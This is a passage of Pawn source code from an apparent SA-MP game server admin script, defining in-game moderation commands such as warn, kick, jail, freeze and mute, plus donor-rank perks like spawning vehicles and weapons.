	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}


CMD:warn(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 1 || PlayerInfo[playerid][Helper] == 1) {
	    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "USAGE: /warn [playerid] [reason]");
    	new warned = strval(tmp), str[128];
		if(PlayerInfo[warned][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
	 	if(IsPlayerConnected(warned) && warned != INVALID_PLAYER_ID) {
 	    	if(warned != playerid) {
 	    	if(Anti_Warn[warned] == 1) return SendClientMessage(playerid, orange,"Player Already Warned");
			    CMDMessageToAdmins(playerid,"WARN");
				PlayerInfo[warned][Warnings]++;
				if(PlayerInfo[playerid][Level] >= 1) {
				if( PlayerInfo[warned][Warnings] == MAX_WARNINGS) {
					format(str, sizeof (str), "Administrator \"%s\" has kicked \"%s\".  ( Warning: %d/%d )", pName(playerid), pName(warned),  PlayerInfo[warned][Warnings], MAX_WARNINGS);
					SendClientMessageToAll(red, str);
					format(str, sizeof (str), "[Reason: %s]",params[1+strlen(tmp)]);
					SendClientMessageToAll(red, str);
					SaveToFile("KickLog",str);	Kick(warned);
					return PlayerInfo[warned][Warnings] = 0;
				} else {
					format(str, sizeof (str), "*Administrator \"%s\" has given \"%s\" a warning ( Warning: %d/%d )", pName(playerid), pName(warned), PlayerInfo[warned][Warnings], MAX_WARNINGS);
					SendClientMessageToAll(yellow, str);
					format(str, sizeof (str), "[Reason: %s]",  params[1+strlen(tmp)]);
				    SendClientMessageToAll(yellow, str);
				    GameTextForPlayer(warned, "You have been ~n~ ~r~ WARNED!", 2500, 3);
				    Anti_Warn[warned] = 1;
				    Warn[playerid] = warned;
					}
				}
				else if(PlayerInfo[playerid][Helper] == 1)
				{
                   if( PlayerInfo[warned][Warnings] == MAX_WARNINGS) {
					format(str, sizeof (str), "*Help moderator \"%s\" has kicked \"%s\". (Warning: %d/%d)*", pName(playerid), pName(warned), PlayerInfo[warned][Warnings], MAX_WARNINGS);
                    SendClientMessageToAll(red, str);
					format(str, sizeof (str), "[ Reason: %s ]",params[1+strlen(tmp)]);
					SendClientMessageToAll(red, str);
					SaveToFile("KickLog",str);	Kick(warned);
					return PlayerInfo[warned][Warnings] = 0;
				    } else {
					format(str, sizeof (str), "*Help moderator \"%s\" has given \"%s\" a warning.( Warning: %d/%d )*", pName(playerid), pName(warned), PlayerInfo[warned][Warnings], MAX_WARNINGS);
					SendClientMessageToAll(yellow, str);
					format(str, sizeof (str), "[Reason: %s]",params[1+strlen(tmp)]);
					SendClientMessageToAll(yellow, str);
					GameTextForPlayer(warned, "You have been ~n~ ~r~ WARNED!", 2500, 3);
					Anti_Warn[warned] = 1;
					Warn[playerid] = warned;
					}
				}
				Anti_Warn[warned] = 1;
				SetTimerEx("AntiWarn", 5000, true, "i", playerid);
				return 1;
			} else return SendClientMessage(playerid, red, "ERROR: You cannot warn yourself");
		} else return SendClientMessage(playerid, red, "ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

forward AntiWarn(playerid);
public AntiWarn(playerid)
{
  Anti_Warn[Warn[playerid]] = 0;
}

CMD:kick(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
	    if(PlayerInfo[playerid][Level] >= 1 || PlayerInfo[playerid][Helper] == 1) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /kick [playerid] [reason]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				GetPlayerName(player1, playername, sizeof(playername));		GetPlayerName(playerid, adminname, sizeof(adminname));
				CMDMessageToAdmins(playerid,"KICK");
				if(PlayerInfo[playerid][LoggedIn] == 1)
				{
				if(PlayerInfo[playerid][Level] >= 1)
				{
				if(isnull(tmp2)) {
					format(string,sizeof(string),"%s has been kicked by Administrator %s ",playername,adminname,params[2]); SendClientMessageToAll(red,string);
					format(string,sizeof(string),"[ No Reason Given ]",params[2]); SendClientMessageToAll(red,string);
					SaveToFile("KickLog",string); print(string); return Kick(player1);
				} else {
					format(string,sizeof(string),"%s has been kicked by Administrator %s ",playername,adminname,params[2]); SendClientMessageToAll(red,string);
					format(string,sizeof(string),"[ Reason: %s ]",params[2]); SendClientMessageToAll(red,string);
					SaveToFile("KickLog",string); print(string); return Kick(player1); }
				}
			}
		    if(PlayerInfo[playerid][Helper] == 1)
				{
                  if(isnull(tmp2)) {
					format(string,sizeof(string),"%s has been kicked by Help moderator %s [no reason given] ",playername,adminname); SendClientMessageToAll(red,string);
					SaveToFile("KickLog",string);
					print(string);
					return Kick(player1);
				} else {
					format(string,sizeof(string),"%s has been kicked by Help moderator %s [reason: %s] ",playername,adminname,params[2]); SendClientMessageToAll(red,string);
					SaveToFile("KickLog",string);
					print(string);
					return Kick(player1); }
				}
			} else return SendClientMessage(playerid, red, "Player is not connected or is yourself or is the highest level admin");
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	} else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
	return 1;
}
CMD:dbike(playerid,params[]) {
 if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][dRank] >= 2) {
		new Float:x,Float:y,Float:z;
		GetPlayerPos(playerid,x,y,z);
		CreateVehicle(522,x,y,z,100,0,0,-1);
		PutPlayerInVehicle(playerid,522,2);
		} else return SendClientMessage(playerid,red,"ERROR: You Need Atleast Donor Rank 2 To Use This Command");
 } else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
return 1;
}

CMD:dcar(playerid,params[]) {
 if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][dRank] >= 1) {
		new Float:x,Float:y,Float:z;
		GetPlayerPos(playerid,x,y,z);
		CreateVehicle(411,x,y,z,100,0,0,-1);
		PutPlayerInVehicle(playerid,411,2);
		} else return SendClientMessage(playerid,red,"ERROR: You Need Atleast Donor Rank 1 To Use This Command");
 } else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
return 1;
}

CMD:dskin(playerid,params[]) {
 if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][dRank] >= 3) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /dskin [skinid]");
		new var = strval(params);
		if(!IsValidSkin(var)) return SendClientMessage(playerid, red, "ERROR: Invaild Skin ID");
       	if(var == 217) return SendClientMessage(playerid, red, "ERROR: You Can't Use Admin Skin!");
	  } else return SendClientMessage(playerid,red,"ERROR: You Need Atleast Donor Rank 3 To Use This Command");
   } else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
   return 1;
}

CMD:dheal(playerid,params[]) {
 if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][dRank] >= 1) {
		if(Anti_heal[playerid] == 0) {
		SetPlayerHealth(playerid,100);
		SendClientMessage(playerid,yellow,"Health Restored!");
		Anti_heal[playerid] = 1;
		} else return SendClientMessage(playerid,red,"ERROR: You Can Use This Per Death Only");
	  } else return SendClientMessage(playerid,red,"ERROR: You Need Atleast Donor Rank 1 To Use This Command");
   } else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
   return 1;
}

CMD:dweap(playerid,params[]) {
 if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][dRank] >= 2) {
		if(Anti_Give[playerid] == 0) {
		GivePlayerWeapon(playerid, 26,500);
		GivePlayerWeapon(playerid, 24,500);
		GivePlayerWeapon(playerid, 35,1);
		GivePlayerWeapon(playerid, 16,2);
		Anti_Give[playerid] = 1;
		} else return SendClientMessage(playerid,red,"ERROR: You Can Use This Per Death Only");
	  } else return SendClientMessage(playerid,red,"ERROR: You Need Atleast Donor Rank 2 To Use This Command");
   } else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
   return 1;
}

CMD:dcolor(playerid,params[]) {
 if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][dRank] >= 2) {
		ShowPlayerDialog(playerid,245,DIALOG_STYLE_LIST,"Color List","{FCF7F9}White\n{1C9139}Green\n{2D5CAD}Blue\n{E8B82A}Orange\n{5C512F}Brwon\n{16F2E7}Light Blue\n{FF0000}Red\n{FF42EF}Pink\n{B907F5}Purple \n{878478}Grey\n{000000}Black","Select","Cancel");
	  } else return SendClientMessage(playerid,red,"ERROR: You Need Atleast Donor Rank 2 To Use This Command");
   } else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
   return 1;
}
CMD:dnos(playerid,params[]) {
 if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][dRank] >= 1) {
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red,"ERROR: You Need be In Vehicle!");
		if(GetPlayerMoney(playerid) < 9000) return SendClientMessage(playerid,red,"ERROR: You Need $9000!");
		AddVehicleComponent(GetPlayerVehicleID(playerid), 1010); // Nitro
		GivePlayerMoney(playerid,-9000);
	  } else return SendClientMessage(playerid,red,"ERROR: You Need Atleast Donor Rank 1 To Use This Command");
   } else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
   return 1;
}
CMD:dhelp(playerid,params[]) {
 if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][dRank] == 0) return SendClientMessage(playerid,red,"ERROR: You Need Atleast Donor Rank 1 To Use This Command");
		if(PlayerInfo[playerid][dRank] == 1)
		{
		  SendClientMessage(playerid,blue,"----== Donor Rank 1 Help ==----");
		  SendClientMessage(playerid,lightblue,"dheal, dcar,dnos");
		}
		else if(PlayerInfo[playerid][dRank] == 2)
		{
		  SendClientMessage(playerid,blue,"----== Donor Rank 2 Help ==----");
		  SendClientMessage(playerid,lightblue,"dheal, dcar,dbike,dweap,dcolor,dnos");
		  SendClientMessage(playerid,lightblue,"Donor Rank 1 Command can be used by you now: dheal, dcar,dnos");
		}
		else if(PlayerInfo[playerid][dRank] == 3)
		{
		  SendClientMessage(playerid,blue,"----== Donor Rank 3 Help ==----");
		  SendClientMessage(playerid,lightblue,"dheal, dcar,dbike,dskin,dweap,dcolor,dnos");
		  SendClientMessage(playerid,lightblue,"Donor Rank 2 Command can be used by you now: dheal, dcar,dbike,dweap,dcolor,dnos");
		  SendClientMessage(playerid,lightblue,"Donor Rank 1 Command can be used by you now: dheal, dcar,dnos");
		}
   } else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
   return 1;
}
CMD:setvip(playerid,params[]) {
if(PlayerInfo[playerid][Level] >= 6) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric2(tmp2)) return SendClientMessage(playerid, red, "USAGE: /setvip [playerid] [Level] | Note : Max Levels = 3 |");
		new player1 = strval(tmp), skin = strval(tmp2), string[128];
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETVIP");
			format(string, sizeof(string), "You have set \"%s's\" VIP Level to '%d", pName(player1), skin); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your VIP Level to '%d'", pName(playerid), skin); SendClientMessage(player1,blue,string); }
   			return PlayerInfo[player1][dRank] = skin;
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}
CMD:slap(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /slap [playerid] [reason/with]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				GetPlayerName(player1, playername, sizeof(playername));		GetPlayerName(playerid, adminname, sizeof(adminname));
				CMDMessageToAdmins(playerid,"SLAP");
		        new Float:Health, Float:x, Float:y, Float:z; GetPlayerHealth(player1,Health);
				GetPlayerPos(player1,x,y,z); SetPlayerPos(player1,x,y,z+6); PlayerPlaySound(playerid,1190,0.0,0.0,0.0); PlayerPlaySound(player1,1190,0.0,0.0,0.0);

				if(strlen(tmp2)) {
					format(string,sizeof(string),"You have slapped %s %s ",playername,params[2]); return SendClientMessage(playerid,blue,string);
				} else {
					format(string,sizeof(string),"You have slapped %s",playername); return SendClientMessage(playerid,blue,string); }
			} else return SendClientMessage(playerid, red, "Player is not connected or is the highest level admin");
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	} else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
}

CMD:explode(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /explode [playerid] [reason]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				GetPlayerName(player1, playername, sizeof(playername)); 	GetPlayerName(playerid, adminname, sizeof(adminname));
				CMDMessageToAdmins(playerid,"EXPLODE");
				new Float:burnx, Float:burny, Float:burnz; GetPlayerPos(player1,burnx, burny, burnz); CreateExplosion(burnx, burny , burnz, 7,10.0);

				if(strlen(tmp2)) {
					format(string,sizeof(string),"You have exploded %s [reason: %s]", playername,params[2]); return SendClientMessage(playerid,blue,string);
				} else {
					format(string,sizeof(string),"You have exploded %s", playername); return SendClientMessage(playerid,blue,string); }
			} else return SendClientMessage(playerid, red, "Player is not connected or is the highest level admin");
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	} else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
}

CMD:jail(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 1) {
		    new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index), tmp3 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /jail [playerid] [minutes] [reason]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				if(PlayerInfo[player1][Jailed] == 0) {
					GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
					new jtime = strval(tmp2);
					if(jtime == 0) jtime = 9999;

			       	CMDMessageToAdmins(playerid,"JAIL");
					PlayerInfo[player1][JailTime] = jtime*1000*60;
    			    JailPlayer(player1);
    			    Jail1(player1);
		        	PlayerInfo[player1][Jailed] = 1;

					if(jtime == 9999) {
						if(!strlen(params[strlen(tmp2)+1])) format(string,sizeof(string),"Administrator %s has jailed %s ",adminname, playername);
						else format(string,sizeof(string),"Administrator %s has jailed %s [reason: %s]",adminname, playername, params[strlen(tmp)+1] );
   					} else {
						if(!strlen(tmp3)) format(string,sizeof(string),"Administrator %s has jailed %s for %d minutes",adminname, playername, jtime);
						else format(string,sizeof(string),"Administrator %s has jailed %s for %d minutes [reason: %s]",adminname, playername, jtime, params[strlen(tmp2)+strlen(tmp)+1] );
					}
	    			return SendClientMessageToAll(blue,string);
				} else return SendClientMessage(playerid, red, "Player is already in jail");
			} else return SendClientMessage(playerid, red, "Player is not connected or is the highest level admin");
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	} else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
}

CMD:unjail(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 1) {
		    new tmp[256], Index; tmp = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /jail [playerid]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				if(PlayerInfo[player1][Jailed] == 1) {
					GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
					format(string,sizeof(string),"Administrator %s has unjailed you",adminname);	SendClientMessage(player1,blue,string);
					format(string,sizeof(string),"Administrator %s has unjailed %s",adminname, playername);
					JailRelease(player1);
					return SendClientMessageToAll(blue,string);
				} else return SendClientMessage(playerid, red, "Player is not in jail");
			} else return SendClientMessage(playerid, red, "Player is not connected or is the highest level admin");
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	} else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
}

CMD:jailed(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2) {
	 		new bool:First2 = false, cout, adminname[MAX_PLAYER_NAME], string[128], i;
		    for(i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && PlayerInfo[i][Jailed]) cout++;
			if(cout == 0) return SendClientMessage(playerid,red, "No players are jailed");

		    for(i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && PlayerInfo[i][Jailed]) {
	    		GetPlayerName(i, adminname, sizeof(adminname));
				if(!First2) { format(string, sizeof(string), "Jailed Players: (%d)%s", i,adminname); First2 = true; }
		        else format(string,sizeof(string),"%s, (%d)%s ",string,i,adminname);
	        }
		    return SendClientMessage(playerid,COLOR_WHITE,string);
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	} else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
}

CMD:freeze(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 3) {
		    new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index), tmp3 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /freeze [playerid] [minutes] [reason]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
				if(PlayerInfo[player1][Frozen] == 0) {
					GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
					new ftime = strval(tmp2);
					if(ftime == 0) ftime = 9999;

			       	CMDMessageToAdmins(playerid,"FREEZE");
					TogglePlayerControllable(player1,false); PlayerInfo[player1][Frozen] = 1; PlayerPlaySound(player1,1057,0.0,0.0,0.0);
					PlayerInfo[player1][FreezeTime] = ftime*1000*60;
			        FreezeTimer[player1] = SetTimerEx("UnFreezeMe",PlayerInfo[player1][FreezeTime],0,"d",player1);

					if(ftime == 9999) {
						if(!strlen(params[strlen(tmp2)+1])) format(string,sizeof(string),"Administrator %s has frozen %s ",adminname, playername);
						else format(string,sizeof(string),"Administrator %s has frozen %s [reason: %s]",adminname, playername, params[strlen(tmp)+1] );
	   				} else {
						if(!strlen(tmp3)) format(string,sizeof(string),"Administrator %s has frozen %s for %d minutes",adminname, playername, ftime);
						else format(string,sizeof(string),"Administrator %s has frozen %s for %d minutes [reason: %s]",adminname, playername, ftime, params[strlen(tmp2)+strlen(tmp)+1] );
					}
		    		return SendClientMessageToAll(blue,string);
				} else return SendClientMessage(playerid, red, "Player is already frozen");
			} else return SendClientMessage(playerid, red, "Player is not connected or is the highest level admin");
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	} else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
}

CMD:unfreeze(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
	    if(PlayerInfo[playerid][Level] >= 3|| IsPlayerAdmin(playerid)) {
		    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /unfreeze [playerid]");
	    	new player1, string[128];
			player1 = strval(params);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
		 	    if(PlayerInfo[player1][Frozen] == 1) {
			       	CMDMessageToAdmins(playerid,"UNFREEZE");
					UnFreezeMe(player1);
					format(string,sizeof(string),"Administrator %s has unfrozen you", PlayerName2(playerid) ); SendClientMessage(player1,blue,string);
					format(string,sizeof(string),"Administrator %s has unfrozen %s", PlayerName2(playerid), PlayerName2(player1));
		    		return SendClientMessageToAll(blue,string);
				} else return SendClientMessage(playerid, red, "Player is not frozen");
			} else return SendClientMessage(playerid, red, "Player is not connected or is the highest level admin");
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	} else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
}

CMD:frozen(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2) {
	 		new bool:First2 = false, cot, adminname[MAX_PLAYER_NAME], string[128], i;
		    for(i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && PlayerInfo[i][Frozen]) cot++;
			if(cot == 0) return SendClientMessage(playerid,red, "No players are frozen");

		    for(i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && PlayerInfo[i][Frozen]) {
	    		GetPlayerName(i, adminname, sizeof(adminname));
				if(!First2) { format(string, sizeof(string), "Frozen Players: (%d)%s", i,adminname); First2 = true; }
		        else format(string,sizeof(string),"%s, (%d)%s ",string,i,adminname);
	        }
		    return SendClientMessage(playerid,COLOR_WHITE,string);
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	} else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
}

CMD:mute(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /mute [playerid] [reason]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
		 	    if(PlayerInfo[player1][Muted] == 0) {
					GetPlayerName(player1, playername, sizeof(playername)); 	GetPlayerName(playerid, adminname, sizeof(adminname));
					CMDMessageToAdmins(playerid,"MUTE");
					PlayerPlaySound(player1,1057,0.0,0.0,0.0);  PlayerInfo[player1][Muted] = 1; PlayerInfo[player1][MuteWarnings] = 0;

					if(strlen(tmp2)) {
						format(string,sizeof(string),"You have been muted by Administrator %s [reason: %s]",adminname,params[2]); SendClientMessage(player1,blue,string);
						format(string,sizeof(string),"You have muted %s [reason: %s]", playername,params[2]); return SendClientMessage(playerid,blue,string);
					} else {
						format(string,sizeof(string),"You have been muted by Administrator %s",adminname); SendClientMessage(player1,blue,string);
						format(string,sizeof(string),"You have muted %s", playername); return SendClientMessage(playerid,blue,string); }
				} else return SendClientMessage(playerid, red, "Player is already muted");
			} else return SendClientMessage(playerid, red, "Player is not connected or is the highest level admin");
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	} else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
}

CMD:unmute(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2) {
		    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /unmute [playerid]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(params);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
		 	    if(PlayerInfo[player1][Muted] == 1) {
					GetPlayerName(player1, playername, sizeof(playername)); 	GetPlayerName(playerid, adminname, sizeof(adminname));
					CMDMessageToAdmins(playerid,"UNMUTE");
					PlayerPlaySound(player1,1057,0.0,0.0,0.0);  PlayerInfo[player1][Muted] = 0; PlayerInfo[player1][MuteWarnings] = 0;
					format(string,sizeof(string),"You have been unmuted by Administrator %s",adminname); SendClientMessage(player1,blue,string);
					format(string,sizeof(string),"You have unmuted %s", playername); return SendClientMessage(playerid,blue,string);
				} else return SendClientMessage(playerid, red, "Player is not muted");
			} else return SendClientMessage(playerid, red, "Player is not connected or is the highest level admin");
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	} else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
}

CMD:muted(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2) {
	 		new bool:First2 = false, cart, adminname[MAX_PLAYER_NAME], string[128], i;
		    for(i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && PlayerInfo[i][Muted]) cart++;
			if(cart == 0) return SendClientMessage(playerid,red, "No players are muted");

		    for(i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && PlayerInfo[i][Muted]) {
	    		GetPlayerName(i, adminname, sizeof(adminname));
				if(!First2) { format(string, sizeof(string), "Muted Players: (%d)%s", i,adminname); First2 = true; }
		        else format(string,sizeof(string),"%s, (%d)%s ",string,i,adminname);
	        }
		    return SendClientMessage(playerid,COLOR_WHITE,string);
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	} else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
}

CMD:akill(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
	    if(PlayerInfo[playerid][Level] >= 3|| IsPlayerAdmin(playerid)) {
		    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /akill [playerid]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(params);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
				if( (PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel] ) )
					return SendClientMessage(playerid, red, "You cannot akill the highest level admin");
				CMDMessageToAdmins(playerid,"AKILL");
				GetPlayerName(player1, playername, sizeof(playername));	GetPlayerName(playerid, adminname, sizeof(adminname));
				format(string,sizeof(string),"Administrator %s has killed you",adminname);	SendClientMessage(player1,blue,string);
				format(string,sizeof(string),"You have killed %s",playername); SendClientMessage(playerid,blue,string);
				return SetPlayerHealth(player1,0.0);
			} else return SendClientMessage(playerid, red, "Player is not connected");
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	} else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
}

CMD:weaps(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 1 || PlayerInfo[playerid][Helper] == 1 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /weaps [playerid]");
    	new player1, string[128], string2[64], WeapName[24], slot, weap, ammo, wh, x;
		player1 = strval(params);

	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			format(string2,sizeof(string2),"[>> %s Weapons (id:%d) <<]", PlayerName2(player1), player1); SendClientMessage(playerid,blue,string2);
			for (slot = 0; slot < 14; slot++) {	GetPlayerWeaponData(player1, slot, weap, ammo); if( ammo != 0 && weap != 0) wh++; }
			if(wh < 1) return SendClientMessage(playerid,blue,"Player has no weapons");

			if(wh >= 1)
			{
				for (slot = 0; slot < 14; slot++)
				{
					GetPlayerWeaponData(player1, slot, weap, ammo);
					if( ammo != 0 && weap != 0)
					{
						GetWeaponName(weap, WeapName, sizeof(WeapName) );
						if(ammo == 65535 || ammo == 1) format(string,sizeof(string),"%s%s (1)",string, WeapName );
						else format(string,sizeof(string),"%s%s (%d)",string, WeapName, ammo );
						x++;
						if(x >= 5)
						{
						    SendClientMessage(playerid, blue, string);
						    x = 0;
							format(string, sizeof(string), "");
						}
						else format(string, sizeof(string), "%s,  ", string);
					}
			    }
				if(x <= 4 && x > 0) {
					string[strlen(string)-3] = '.';
				    SendClientMessage(playerid, blue, string);
				}
		    }
		    return 1;
		} else return SendClientMessage(playerid, red, "Player is not connected");
